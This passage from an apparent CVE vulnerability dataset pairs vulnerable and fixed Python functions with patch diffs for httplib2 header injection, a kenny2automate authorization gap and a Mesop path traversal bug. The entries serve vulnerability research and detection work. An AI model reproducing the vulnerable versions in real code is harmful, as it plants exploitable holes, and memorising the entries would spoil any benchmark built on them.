   info = email.message_from_bytes(info)\n                        for k, v in info.items():\n                            if v.startswith(\"=?\") and v.endswith(\"?=\"):\n                                info.replace_header(\n                                    k, str(*email.header.decode_header(v)[0])\n                                )\n                    except (IndexError, ValueError):\n                        self.cache.delete(cachekey)\n                        cachekey = None\n                        cached_value = None\n\n            if (\n                method in self.optimistic_concurrency_methods\n                and self.cache\n                and \"etag\" in info\n                and not self.ignore_etag\n                and \"if-match\" not in headers\n            ):\n                # http://www.w3.org/1999/04/Editing/\n                headers[\"if-match\"] = info[\"etag\"]\n\n            # https://tools.ietf.org/html/rfc7234\n            # A cache MUST invalidate the effective Request URI as well as [...] Location and Content-Location\n            # when a non-error status code is received in response to an unsafe request method.\n            if self.cache and cachekey and method not in self.safe_methods:\n                self.cache.delete(cachekey)\n\n            # Check the vary header in the cache to see if this request\n            # matches what varies in the cache.\n            if method in self.safe_methods and \"vary\" in info:\n                vary = info[\"vary\"]\n                vary_headers = vary.lower().replace(\" \", \"\").split(\",\")\n                for header in vary_headers:\n                    key = \"-varied-%s\" % header\n                    value = info[key]\n                    if headers.get(header, None) != value:\n                        cached_value = None\n                        break\n\n            if (\n                self.cache\n                and cached_value\n                and (method in self.safe_methods or info[\"status\"] == \"308\")\n                and \"range\" not in headers\n            ):\n                redirect_method = method\n                if info[\"status\"] not in (\"307\", \"308\"):\n                    redirect_method = \"GET\"\n                if \"-x-permanent-redirect-url\" in info:\n                    # Should cached permanent redirects be counted in our redirection count? For now, yes.\n                    if redirections <= 0:\n                        raise RedirectLimit(\n                            \"Redirected more times than redirection_limit allows.\",\n                            {},\n                            \"\",\n                        )\n                    (response, new_content) = self.request(\n                        info[\"-x-permanent-redirect-url\"],\n                        method=redirect_method,\n                        headers=headers,\n                        redirections=redirections - 1,\n                    )\n                    response.previous = Response(info)\n                    response.previous.fromcache = True\n                else:\n                    # Determine our course of action:\n                    #   Is the cached entry fresh or stale?\n                    #   Has the client requested a non-cached response?\n                    #\n                    # There seems to be three possible answers:\n                    # 1. [FRESH] Return the cache entry w/o doing a GET\n                    # 2. [STALE] Do the GET (but add in cache validators if available)\n                    # 3. [TRANSPARENT] Do a GET w/o any cache validators (Cache-Control: no-cache) on the request\n                    entry_disposition = _entry_disposition(info, headers)\n\n                    if entry_disposition == \"FRESH\":\n                        if not cached_value:\n                            info[\"status\"] = \"504\"\n                            content = b\"\"\n                        response = Response(info)\n                        if cached_value:\n                            response.fromcache = True\n                        return (response, content)\n\n                    if entry_disposition == \"STALE\":\n                        if (\n                            \"etag\" in info\n                            and not self.ignore_etag\n                            and not \"if-none-match\" in headers\n                        ):\n                            headers[\"if-none-match\"] = info[\"etag\"]\n                        if \"last-modified\" in info and not \"last-modified\" in headers:\n                            headers[\"if-modified-since\"] = info[\"last-modified\"]\n                    elif entry_disposition == \"TRANSPARENT\":\n                        pass\n\n                    (response, new_content) = self._request(\n                        conn,\n                        authority,\n                        uri,\n                        request_uri,\n                        method,\n                        body,\n                        headers,\n                        redirections,\n                        cachekey,\n                    )\n\n                if response.status == 304 and method == \"GET\":\n                    # Rewrite the cache entry with the new end-to-end headers\n                    # Take all headers that are in response\n                    # and overwrite their values in info.\n                    # unless they are hop-by-hop, or are listed in the connection header.\n\n                    for key in _get_end2end_headers(response):\n                        info[key] = response[key]\n                    merged_response = Response(info)\n                    if hasattr(response, \"_stale_digest\"):\n                        merged_response._stale_digest = response._stale_digest\n                    _updateCache(\n                        headers, merged_response, content, self.cache, cachekey\n                    )\n                    response = merged_response\n                    response.status = 200\n                    response.fromcache = True\n\n                elif response.status == 200:\n                    content = new_content\n                else:\n                    self.cache.delete(cachekey)\n                    content = new_content\n            else:\n                cc = _parse_cache_control(headers)\n                if \"only-if-cached\" in cc:\n                    info[\"status\"] = \"504\"\n                    response = Response(info)\n                    content = b\"\"\n                else:\n                    (response, content) = self._request(\n                        conn,\n                        authority,\n                        uri,\n                        request_uri,\n                        method,\n                        body,\n                        headers,\n                        redirections,\n                        cachekey,\n                    )\n        except Exception as e:\n            is_timeout = isinstance(e, socket.timeout)\n            if is_timeout:\n                conn = self.connections.pop(conn_key, None)\n                if conn:\n                    conn.close()\n\n            if self.force_exception_to_status_code:\n                if isinstance(e, HttpLib2ErrorWithResponse):\n                    response = e.response\n                    content = e.content\n                    response.status = 500\n                    response.reason = str(e)\n                elif isinstance(e, socket.timeout):\n                    content = b\"Request Timeout\"\n                    response = Response(\n                        {\n                            \"content-type\": \"text/plain\",\n                            \"status\": \"408\",\n                            \"content-length\": len(content),\n                        }\n                    )\n                    response.reason = \"Request Timeout\"\n                else:\n                    content = str(e).encode(\"utf-8\")\n                    response = Response(\n                        {\n                            \"content-type\": \"text/plain\",\n                            \"status\": \"400\",\n                            \"content-length\": len(content),\n                        }\n                    )\n                    response.reason = \"Bad Request\"\n            else:\n                raise\n\n        return (response, content)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_157_1",
        "commit": "a1457cc",
        "file_path": "python2/httplib2/__init__.py",
        "start_line": 1946,
        "end_line": 2230,
        "snippet": "    def request(\n        self,\n        uri,\n        method=\"GET\",\n        body=None,\n        headers=None,\n        redirections=DEFAULT_MAX_REDIRECTS,\n        connection_type=None,\n    ):\n        \"\"\" Performs a single HTTP request.\n\n        The 'uri' is the URI of the HTTP resource and can begin with either\n        'http' or 'https'. The value of 'uri' must be an absolute URI.\n\n        The 'method' is the HTTP method to perform, such as GET, POST, DELETE,\n        etc. There is no restriction on the methods allowed.\n\n        The 'body' is the entity body to be sent with the request. It is a\n        string object.\n\n        Any extra headers that are to be sent with the request should be\n        provided in the 'headers' dictionary.\n\n        The maximum number of redirect to follow before raising an\n        exception is 'redirections. The default is 5.\n\n        The return value is a tuple of (response, content), the first\n        being and instance of the 'Response' class, the second being\n        a string that contains the response entity body.\n        \"\"\"\n        conn_key = ''\n\n        try:\n            if headers is None:\n                headers = {}\n            else:\n                headers = self._normalize_headers(headers)\n\n            if \"user-agent\" not in headers:\n                headers[\"user-agent\"] = \"Python-httplib2/%s (gzip)\" % __version__\n\n            uri = iri2uri(uri)\n            # Prevent CWE-75 space injection to manipulate request via part of uri.\n            # Prevent CWE-93 CRLF injection to modify headers via part of uri.\n            uri = uri.replace(\" \", \"%20\").replace(\"\\r\", \"%0D\").replace(\"\\n\", \"%0A\")\n\n            (scheme, authority, request_uri, defrag_uri) = urlnorm(uri)\n\n            proxy_info = self._get_proxy_info(scheme, authority)\n\n            conn_key = scheme + \":\" + authority\n            conn = self.connections.get(conn_key)\n            if conn is None:\n                if not connection_type:\n                    connection_type = SCHEME_TO_CONNECTION[scheme]\n                certs = list(self.certificates.iter(authority))\n                if scheme == \"https\":\n                    if certs:\n                        conn = self.connections[conn_key] = connection_type(\n                            authority,\n                            key_file=certs[0][0],\n                            cert_file=certs[0][1],\n                            timeout=self.timeout,\n                            proxy_info=proxy_info,\n                            ca_certs=self.ca_certs,\n                            disable_ssl_certificate_validation=self.disable_ssl_certificate_validation,\n                            ssl_version=self.ssl_version,\n                            key_password=certs[0][2],\n                        )\n                    else:\n                        conn = self.connections[conn_key] = connection_type(\n                            authority,\n                            timeout=self.timeout,\n                            proxy_info=proxy_info,\n                            ca_certs=self.ca_certs,\n                            disable_ssl_certificate_validation=self.disable_ssl_certificate_validation,\n                            ssl_version=self.ssl_version,\n                        )\n                else:\n                    conn = self.connections[conn_key] = connection_type(\n                        authority, timeout=self.timeout, proxy_info=proxy_info\n                    )\n                conn.set_debuglevel(debuglevel)\n\n            if \"range\" not in headers and \"accept-encoding\" not in headers:\n                headers[\"accept-encoding\"] = \"gzip, deflate\"\n\n            info = email.Message.Message()\n            cachekey = None\n            cached_value = None\n            if self.cache:\n                cachekey = defrag_uri.encode(\"utf-8\")\n                cached_value = self.cache.get(cachekey)\n                if cached_value:\n                    # info = email.message_from_string(cached_value)\n                    #\n                    # Need to replace the line above with the kludge below\n                    # to fix the non-existent bug not fixed in this\n                    # bug report: http://mail.python.org/pipermail/python-bugs-list/2005-September/030289.html\n                    try:\n                        info, content = cached_value.split(\"\\r\\n\\r\\n\", 1)\n                        feedparser = email.FeedParser.FeedParser()\n                        feedparser.feed(info)\n                        info = feedparser.close()\n                        feedparser._parse = None\n                    except (IndexError, ValueError):\n                        self.cache.delete(cachekey)\n                        cachekey = None\n                        cached_value = None\n\n            if (\n                method in self.optimistic_concurrency_methods\n                and self.cache\n                and \"etag\" in info\n                and not self.ignore_etag\n                and \"if-match\" not in headers\n            ):\n                # http://www.w3.org/1999/04/Editing/\n                headers[\"if-match\"] = info[\"etag\"]\n\n            # https://tools.ietf.org/html/rfc7234\n            # A cache MUST invalidate the effective Request URI as well as [...] Location and Content-Location\n            # when a non-error status code is received in response to an unsafe request method.\n            if self.cache and cachekey and method not in self.safe_methods:\n                self.cache.delete(cachekey)\n\n            # Check the vary header in the cache to see if this request\n            # matches what varies in the cache.\n            if method in self.safe_methods and \"vary\" in info:\n                vary = info[\"vary\"]\n                vary_headers = vary.lower().replace(\" \", \"\").split(\",\")\n                for header in vary_headers:\n                    key = \"-varied-%s\" % header\n                    value = info[key]\n                    if headers.get(header, None) != value:\n                        cached_value = None\n                        break\n\n            if (\n                self.cache\n                and cached_value\n                and (method in self.safe_methods or info[\"status\"] == \"308\")\n                and \"range\" not in headers\n            ):\n                redirect_method = method\n                if info[\"status\"] not in (\"307\", \"308\"):\n                    redirect_method = \"GET\"\n                if \"-x-permanent-redirect-url\" in info:\n                    # Should cached permanent redirects be counted in our redirection count? For now, yes.\n                    if redirections <= 0:\n                        raise RedirectLimit(\n                            \"Redirected more times than rediection_limit allows.\",\n                            {},\n                            \"\",\n                        )\n                    (response, new_content) = self.request(\n                        info[\"-x-permanent-redirect-url\"],\n                        method=redirect_method,\n                        headers=headers,\n                        redirections=redirections - 1,\n                    )\n                    response.previous = Response(info)\n                    response.previous.fromcache = True\n                else:\n                    # Determine our course of action:\n                    #   Is the cached entry fresh or stale?\n                    #   Has the client requested a non-cached response?\n                    #\n                    # There seems to be three possible answers:\n                    # 1. [FRESH] Return the cache entry w/o doing a GET\n                    # 2. [STALE] Do the GET (but add in cache validators if available)\n                    # 3. [TRANSPARENT] Do a GET w/o any cache validators (Cache-Control: no-cache) on the request\n                    entry_disposition = _entry_disposition(info, headers)\n\n                    if entry_disposition == \"FRESH\":\n                        if not cached_value:\n                            info[\"status\"] = \"504\"\n                            content = \"\"\n                        response = Response(info)\n                        if cached_value:\n                            response.fromcache = True\n                        return (response, content)\n\n                    if entry_disposition == \"STALE\":\n                        if (\n                            \"etag\" in info\n                            and not self.ignore_etag\n                            and not \"if-none-match\" in headers\n                        ):\n                            headers[\"if-none-match\"] = info[\"etag\"]\n                        if \"last-modified\" in info and not \"last-modified\" in headers:\n                            headers[\"if-modified-since\"] = info[\"last-modified\"]\n                    elif entry_disposition == \"TRANSPARENT\":\n                        pass\n\n                    (response, new_content) = self._request(\n                        conn,\n                        authority,\n                        uri,\n                        request_uri,\n                        method,\n                        body,\n                        headers,\n                        redirections,\n                        cachekey,\n                    )\n\n                if response.status == 304 and method == \"GET\":\n                    # Rewrite the cache entry with the new end-to-end headers\n                    # Take all headers that are in response\n                    # and overwrite their values in info.\n                    # unless they are hop-by-hop, or are listed in the connection header.\n\n                    for key in _get_end2end_headers(response):\n                        info[key] = response[key]\n                    merged_response = Response(info)\n                    if hasattr(response, \"_stale_digest\"):\n                        merged_response._stale_digest = response._stale_digest\n                    _updateCache(\n                        headers, merged_response, content, self.cache, cachekey\n                    )\n                    response = merged_response\n                    response.status = 200\n                    response.fromcache = True\n\n                elif response.status == 200:\n                    content = new_content\n                else:\n                    self.cache.delete(cachekey)\n                    content = new_content\n            else:\n                cc = _parse_cache_control(headers)\n                if \"only-if-cached\" in cc:\n                    info[\"status\"] = \"504\"\n                    response = Response(info)\n                    content = \"\"\n                else:\n                    (response, content) = self._request(\n                        conn,\n                        authority,\n                        uri,\n                        request_uri,\n                        method,\n                        body,\n                        headers,\n                        redirections,\n                        cachekey,\n                    )\n        except Exception as e:\n            is_timeout = isinstance(e, socket.timeout)\n            if is_timeout:\n                conn = self.connections.pop(conn_key, None)\n                if conn:\n                    conn.close()\n\n            if self.force_exception_to_status_code:\n                if isinstance(e, HttpLib2ErrorWithResponse):\n                    response = e.response\n                    content = e.content\n                    response.status = 500\n                    response.reason = str(e)\n                elif is_timeout:\n                    content = \"Request Timeout\"\n                    response = Response(\n                        {\n                            \"content-type\": \"text/plain\",\n                            \"status\": \"408\",\n                            \"content-length\": len(content),\n                        }\n                    )\n                    response.reason = \"Request Timeout\"\n                else:\n                    content = str(e)\n                    response = Response(\n                        {\n                            \"content-type\": \"text/plain\",\n                            \"status\": \"400\",\n                            \"content-length\": len(content),\n                        }\n                    )\n                    response.reason = \"Bad Request\"\n            else:\n                raise\n\n        return (response, content)"
      },
      {
        "id": "fix_py_157_2",
        "commit": "a1457cc",
        "file_path": "python3/httplib2/__init__.py",
        "start_line": 1752,
        "end_line": 2032,
        "snippet": "    def request(\n        self,\n        uri,\n        method=\"GET\",\n        body=None,\n        headers=None,\n        redirections=DEFAULT_MAX_REDIRECTS,\n        connection_type=None,\n    ):\n        \"\"\" Performs a single HTTP request.\nThe 'uri' is the URI of the HTTP resource and can begin\nwith either 'http' or 'https'. The value of 'uri' must be an absolute URI.\n\nThe 'method' is the HTTP method to perform, such as GET, POST, DELETE, etc.\nThere is no restriction on the methods allowed.\n\nThe 'body' is the entity body to be sent with the request. It is a string\nobject.\n\nAny extra headers that are to be sent with the request should be provided in the\n'headers' dictionary.\n\nThe maximum number of redirect to follow before raising an\nexception is 'redirections. The default is 5.\n\nThe return value is a tuple of (response, content), the first\nbeing and instance of the 'Response' class, the second being\na string that contains the response entity body.\n        \"\"\"\n        conn_key = ''\n\n        try:\n            if headers is None:\n                headers = {}\n            else:\n                headers = self._normalize_headers(headers)\n\n            if \"user-agent\" not in headers:\n                headers[\"user-agent\"] = \"Python-httplib2/%s (gzip)\" % __version__\n\n            uri = iri2uri(uri)\n            # Prevent CWE-75 space injection to manipulate request via part of uri.\n            # Prevent CWE-93 CRLF injection to modify headers via part of uri.\n            uri = uri.replace(\" \", \"%20\").replace(\"\\r\", \"%0D\").replace(\"\\n\", \"%0A\")\n\n            (scheme, authority, request_uri, defrag_uri) = urlnorm(uri)\n\n            conn_key = scheme + \":\" + authority\n            conn = self.connections.get(conn_key)\n            if conn is None:\n                if not connection_type:\n                    connection_type = SCHEME_TO_CONNECTION[scheme]\n                certs = list(self.certificates.iter(authority))\n                if issubclass(connection_type, HTTPSConnectionWithTimeout):\n                    if certs:\n                        conn = self.connections[conn_key] = connection_type(\n                            authority,\n                            key_file=certs[0][0],\n                            cert_file=certs[0][1],\n                            timeout=self.timeout,\n                            proxy_info=self.proxy_info,\n                            ca_certs=self.ca_certs,\n                            disable_ssl_certificate_validation=self.disable_ssl_certificate_validation,\n                            tls_maximum_version=self.tls_maximum_version,\n                            tls_minimum_version=self.tls_minimum_version,\n                            key_password=certs[0][2],\n                        )\n                    else:\n                        conn = self.connections[conn_key] = connection_type(\n                            authority,\n                            timeout=self.timeout,\n                            proxy_info=self.proxy_info,\n                            ca_certs=self.ca_certs,\n                            disable_ssl_certificate_validation=self.disable_ssl_certificate_validation,\n                            tls_maximum_version=self.tls_maximum_version,\n                            tls_minimum_version=self.tls_minimum_version,\n                        )\n                else:\n                    conn = self.connections[conn_key] = connection_type(\n                        authority, timeout=self.timeout, proxy_info=self.proxy_info\n                    )\n                conn.set_debuglevel(debuglevel)\n\n            if \"range\" not in headers and \"accept-encoding\" not in headers:\n                headers[\"accept-encoding\"] = \"gzip, deflate\"\n\n            info = email.message.Message()\n            cachekey = None\n            cached_value = None\n            if self.cache:\n                cachekey = defrag_uri\n                cached_value = self.cache.get(cachekey)\n                if cached_value:\n                    try:\n                        info, content = cached_value.split(b\"\\r\\n\\r\\n\", 1)\n                        info = email.message_from_bytes(info)\n                        for k, v in info.items():\n                            if v.startswith(\"=?\") and v.endswith(\"?=\"):\n                                info.replace_header(\n                                    k, str(*email.header.decode_header(v)[0])\n                                )\n                    except (IndexError, ValueError):\n                        self.cache.delete(cachekey)\n                        cachekey = None\n                        cached_value = None\n\n            if (\n                method in self.optimistic_concurrency_methods\n                and self.cache\n                and \"etag\" in info\n                and not self.ignore_etag\n                and \"if-match\" not in headers\n            ):\n                # http://www.w3.org/1999/04/Editing/\n                headers[\"if-match\"] = info[\"etag\"]\n\n            # https://tools.ietf.org/html/rfc7234\n            # A cache MUST invalidate the effective Request URI as well as [...] Location and Content-Location\n            # when a non-error status code is received in response to an unsafe request method.\n            if self.cache and cachekey and method not in self.safe_methods:\n                self.cache.delete(cachekey)\n\n            # Check the vary header in the cache to see if this request\n            # matches what varies in the cache.\n            if method in self.safe_methods and \"vary\" in info:\n                vary = info[\"vary\"]\n                vary_headers = vary.lower().replace(\" \", \"\").split(\",\")\n                for header in vary_headers:\n                    key = \"-varied-%s\" % header\n                    value = info[key]\n                    if headers.get(header, None) != value:\n                        cached_value = None\n                        break\n\n            if (\n                self.cache\n                and cached_value\n                and (method in self.safe_methods or info[\"status\"] == \"308\")\n                and \"range\" not in headers\n            ):\n                redirect_method = method\n                if info[\"status\"] not in (\"307\", \"308\"):\n                    redirect_method = \"GET\"\n                if \"-x-permanent-redirect-url\" in info:\n                    # Should cached permanent redirects be counted in our redirection count? For now, yes.\n                    if redirections <= 0:\n                        raise RedirectLimit(\n                            \"Redirected more times than redirection_limit allows.\",\n                            {},\n                            \"\",\n                        )\n                    (response, new_content) = self.request(\n                        info[\"-x-permanent-redirect-url\"],\n                        method=redirect_method,\n                        headers=headers,\n                        redirections=redirections - 1,\n                    )\n                    response.previous = Response(info)\n                    response.previous.fromcache = True\n                else:\n                    # Determine our course of action:\n                    #   Is the cached entry fresh or stale?\n                    #   Has the client requested a non-cached response?\n                    #\n                    # There seems to be three possible answers:\n                    # 1. [FRESH] Return the cache entry w/o doing a GET\n                    # 2. [STALE] Do the GET (but add in cache validators if available)\n                    # 3. [TRANSPARENT] Do a GET w/o any cache validators (Cache-Control: no-cache) on the request\n                    entry_disposition = _entry_disposition(info, headers)\n\n                    if entry_disposition == \"FRESH\":\n                        if not cached_value:\n                            info[\"status\"] = \"504\"\n                            content = b\"\"\n                        response = Response(info)\n                        if cached_value:\n                            response.fromcache = True\n                        return (response, content)\n\n                    if entry_disposition == \"STALE\":\n                        if (\n                            \"etag\" in info\n                            and not self.ignore_etag\n                            and not \"if-none-match\" in headers\n                        ):\n                            headers[\"if-none-match\"] = info[\"etag\"]\n                        if \"last-modified\" in info and not \"last-modified\" in headers:\n                            headers[\"if-modified-since\"] = info[\"last-modified\"]\n                    elif entry_disposition == \"TRANSPARENT\":\n                        pass\n\n                    (response, new_content) = self._request(\n                        conn,\n                        authority,\n                        uri,\n                        request_uri,\n                        method,\n                        body,\n                        headers,\n                        redirections,\n                        cachekey,\n                    )\n\n                if response.status == 304 and method == \"GET\":\n                    # Rewrite the cache entry with the new end-to-end headers\n                    # Take all headers that are in response\n                    # and overwrite their values in info.\n                    # unless they are hop-by-hop, or are listed in the connection header.\n\n                    for key in _get_end2end_headers(response):\n                        info[key] = response[key]\n                    merged_response = Response(info)\n                    if hasattr(response, \"_stale_digest\"):\n                        merged_response._stale_digest = response._stale_digest\n                    _updateCache(\n                        headers, merged_response, content, self.cache, cachekey\n                    )\n                    response = merged_response\n                    response.status = 200\n                    response.fromcache = True\n\n                elif response.status == 200:\n                    content = new_content\n                else:\n                    self.cache.delete(cachekey)\n                    content = new_content\n            else:\n                cc = _parse_cache_control(headers)\n                if \"only-if-cached\" in cc:\n                    info[\"status\"] = \"504\"\n                    response = Response(info)\n                    content = b\"\"\n                else:\n                    (response, content) = self._request(\n                        conn,\n                        authority,\n                        uri,\n                        request_uri,\n                        method,\n                        body,\n                        headers,\n                        redirections,\n                        cachekey,\n                    )\n        except Exception as e:\n            is_timeout = isinstance(e, socket.timeout)\n            if is_timeout:\n                conn = self.connections.pop(conn_key, None)\n                if conn:\n                    conn.close()\n\n            if self.force_exception_to_status_code:\n                if isinstance(e, HttpLib2ErrorWithResponse):\n                    response = e.response\n                    content = e.content\n                    response.status = 500\n                    response.reason = str(e)\n                elif isinstance(e, socket.timeout):\n                    content = b\"Request Timeout\"\n                    response = Response(\n                        {\n                            \"content-type\": \"text/plain\",\n                            \"status\": \"408\",\n                            \"content-length\": len(content),\n                        }\n                    )\n                    response.reason = \"Request Timeout\"\n                else:\n                    content = str(e).encode(\"utf-8\")\n                    response = Response(\n                        {\n                            \"content-type\": \"text/plain\",\n                            \"status\": \"400\",\n                            \"content-length\": len(content),\n                        }\n                    )\n                    response.reason = \"Bad Request\"\n            else:\n                raise\n\n        return (response, content)"
      }
    ],
    "vul_patch": "--- a/python2/httplib2/__init__.py\n+++ b/python2/httplib2/__init__.py\n@@ -40,6 +40,9 @@\n                 headers[\"user-agent\"] = \"Python-httplib2/%s (gzip)\" % __version__\n \n             uri = iri2uri(uri)\n+            # Prevent CWE-75 space injection to manipulate request via part of uri.\n+            # Prevent CWE-93 CRLF injection to modify headers via part of uri.\n+            uri = uri.replace(\" \", \"%20\").replace(\"\\r\", \"%0D\").replace(\"\\n\", \"%0A\")\n \n             (scheme, authority, request_uri, defrag_uri) = urlnorm(uri)\n \n\n--- a/python3/httplib2/__init__.py\n+++ b/python3/httplib2/__init__.py\n@@ -39,6 +39,9 @@\n                 headers[\"user-agent\"] = \"Python-httplib2/%s (gzip)\" % __version__\n \n             uri = iri2uri(uri)\n+            # Prevent CWE-75 space injection to manipulate request via part of uri.\n+            # Prevent CWE-93 CRLF injection to modify headers via part of uri.\n+            uri = uri.replace(\" \", \"%20\").replace(\"\\r\", \"%0D\").replace(\"\\n\", \"%0A\")\n \n             (scheme, authority, request_uri, defrag_uri) = urlnorm(uri)\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-22452",
    "cve_description": "kenny2automate is a Discord bot. In the web interface for server settings, form elements were generated with Discord channel IDs as part of input names. Prior to commit a947d7c, no validation was performed to ensure that the channel IDs submitted actually belonged to the server being configured. Thus anyone who has access to the channel ID they wish to change settings for and the server settings panel for any server could change settings for the requested channel no matter which server it belonged to. Commit a947d7c resolves the issue and has been deployed to the official instance of the bot. The only workaround that exists is to disable the web config entirely by changing it to run on localhost. Note that a workaround is only necessary for those who run their own instance of the bot.",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/Kenny2github/kenny2automate",
    "patch_url": [
      "https://github.com/Kenny2github/kenny2automate/commit/a947d7ce408687b587c7e6dfd6026f7c4ee31ac2"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_249_1",
        "commit": "a5e1ac9",
        "file_path": "kenny2automate/server/__init__.py",
        "start_line": 551,
        "end_line": 593,
        "snippet": "    async def save_server(self, request):\n        await self.elg(request)\n        guild = self.bot.get_guild(int(request.match_info.get('server', '0')))\n        if guild is None:\n            self.notfound()\n        if not guild.get_member(\n            int(self.getsesh(request)['client']['id'])\n        ).guild_permissions.administrator:\n            self.notfound()\n        data = await request.post()\n        params = []\n        otherparams = {}\n        for k in data.keys():\n            if not k.startswith('channel-'):\n                otherparams[k] = ','.join(data.getall(k))\n                continue\n            param = {'channel_id': int(k[len('channel-'):])}\n            for v in data.getall(k):\n                v = v.partition('=')\n                if v[0] == 'ping':\n                    if 'ping' not in param:\n                        param['ping'] = set()\n                    param['ping'].add(v[-1])\n                else:\n                    param[v[0]] = v[-1] or None\n            param['ping'] = '|'.join(param.get('ping', ())) or None\n            params.append(param)\n        otherparams['guild_id'] = guild.id\n        try:\n            with self.db.connection:\n                self.db.executemany(\n                    'UPDATE channels SET lang=:lang, games_ping=:ping \\\nWHERE channel_id=:channel_id',\n                    params\n                )\n                self.db.execute(\n                    'UPDATE guilds SET guild_disabled_commands=:disable_cmd, \\\nguild_disabled_cogs=:disable_cog, words_censor=:words_censor WHERE guild_id=:guild_id',\n                    otherparams\n                )\n        except sql.ProgrammingError as exc:\n            raise web.HTTPBadRequest(reason=str(exc))\n        raise web.HTTPSeeOther(request.path)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_249_1",
        "commit": "a947d7c",
        "file_path": "kenny2automate/server/__init__.py",
        "start_line": 551,
        "end_line": 596,
        "snippet": "    async def save_server(self, request):\n        await self.elg(request)\n        guild = self.bot.get_guild(int(request.match_info.get('server', '0')))\n        if guild is None:\n            self.notfound()\n        if not guild.get_member(\n            int(self.getsesh(request)['client']['id'])\n        ).guild_permissions.administrator:\n            self.notfound()\n        data = await request.post()\n        params = []\n        otherparams = {}\n        for k in data.keys():\n            if not k.startswith('channel-'):\n                otherparams[k] = ','.join(data.getall(k))\n                continue\n            param = {'channel_id': int(k[len('channel-'):])}\n            for v in data.getall(k):\n                v = v.partition('=')\n                if v[0] == 'ping':\n                    if 'ping' not in param:\n                        param['ping'] = set()\n                    param['ping'].add(v[-1])\n                else:\n                    param[v[0]] = v[-1] or None\n            param['ping'] = '|'.join(param.get('ping', ())) or None\n            params.append(param)\n        otherparams['guild_id'] = guild.id\n        if set(param['channel_id'] for param in params) \\\n                - set(channel.id for channel in guild.channels): # is not empty\n            raise web.HTTPBadRequest\n        try:\n            with self.db.connection:\n                self.db.executemany(\n                    'UPDATE channels SET lang=:lang, games_ping=:ping \\\nWHERE channel_id=:channel_id',\n                    params\n                )\n                self.db.execute(\n                    'UPDATE guilds SET guild_disabled_commands=:disable_cmd, \\\nguild_disabled_cogs=:disable_cog, words_censor=:words_censor WHERE guild_id=:guild_id',\n                    otherparams\n                )\n        except sql.ProgrammingError as exc:\n            raise web.HTTPBadRequest(reason=str(exc))\n        raise web.HTTPSeeOther(request.path)"
      }
    ],
    "vul_patch": "--- a/kenny2automate/server/__init__.py\n+++ b/kenny2automate/server/__init__.py\n@@ -26,6 +26,9 @@\n             param['ping'] = '|'.join(param.get('ping', ())) or None\n             params.append(param)\n         otherparams['guild_id'] = guild.id\n+        if set(param['channel_id'] for param in params) \\\n+                - set(channel.id for channel in guild.channels): # is not empty\n+            raise web.HTTPBadRequest\n         try:\n             with self.db.connection:\n                 self.db.executemany(\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-45601",
    "cve_description": "Mesop is a Python-based UI framework designed for rapid web apps development. A vulnerability has been discovered and fixed in Mesop that could potentially allow unauthorized access to files on the server hosting the Mesop application. The vulnerability was related to insufficient input validation in a specific endpoint. This could have allowed an attacker to access files not intended to be served. Users are strongly advised to update to the latest version of Mesop immediately. The latest version includes a fix for this vulnerability. At time of publication 0.12.4 is the most recently available version of Mesop.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/google/mesop",
    "patch_url": [
      "https://github.com/google/mesop/commit/17fb769d6a91f0a8cbccfab18f64977b158a6a31"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_233_1",
        "commit": "6f021e8",
        "file_path": "mesop/server/static_file_serving.py",
        "start_line": 93,
        "end_line": 104,
        "snippet": "  def serve_web_components(path: str):\n    if not is_file_path(path):\n      raise MesopException(\"Unexpected request to \" + path)\n    serving_path = (\n      get_runfile_location(path)\n      if has_runfiles()\n      else os.path.join(os.getcwd(), path)\n    )\n    return send_file_compressed(\n      serving_path,\n      disable_gzip_cache=disable_gzip_cache,\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_233_1",
        "commit": "17fb769",
        "file_path": "mesop/server/static_file_serving.py",
        "start_line": 93,
        "end_line": 115,
        "snippet": "  def serve_web_components(path: str):\n    if not is_file_path(path):\n      raise MesopException(\"Unexpected request to \" + path)\n    serving_path = (\n      get_runfile_location(path)\n      if has_runfiles()\n      else safe_join(os.getcwd(), path)\n    )\n\n    file_name = os.path.basename(path)\n    file_extension = os.path.splitext(file_name)[1].lower()\n    allowed_extensions = {\".js\", \".css\"}\n    if file_extension not in allowed_extensions:\n      raise MesopException(\n        f\"Unexpected file type: {file_extension}. Only {', '.join(allowed_extensions)} files are allowed.\"\n      )\n\n    if not serving_path:\n      raise MesopException(\"Unexpected request to \" + path)\n    return send_file_compressed(\n      serving_path,\n      disable_gzip_cache=disable_gzip_cache,\n    )"
      }
    ],
    "vul_patch": "--- a/mesop/server/static_file_serving.py\n+++ b/mesop/server/static_file_serving.py\n@@ -4,8 +4,19 @@\n     serving_path = (\n       get_runfile_location(path)\n       if has_runfiles()\n-      else os.path.join(os.getcwd(), path)\n+      else safe_join(os.getcwd(), path)\n     )\n+\n+    file_name = os.path.basename(path)\n+    file_extension = os.path.splitext(file_name)[1].lower()\n+    allowed_extensions = {\".js\", \".css\"}\n+    if file_extension not in allowed_extensions:\n+      raise MesopException(\n+        f\"Unexpected file type: {file_extension}. Only {', '.join(allowed_extensions)} files are allowed.\"\n+      )\n+\n+    if not serving_path:\n+      raise MesopException(\"Unexpected request to \" + path)\n     return send_file_compressed(\n       serving_path,\n       disable_gzip_cache=disable_gzip_cache,\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-4314",
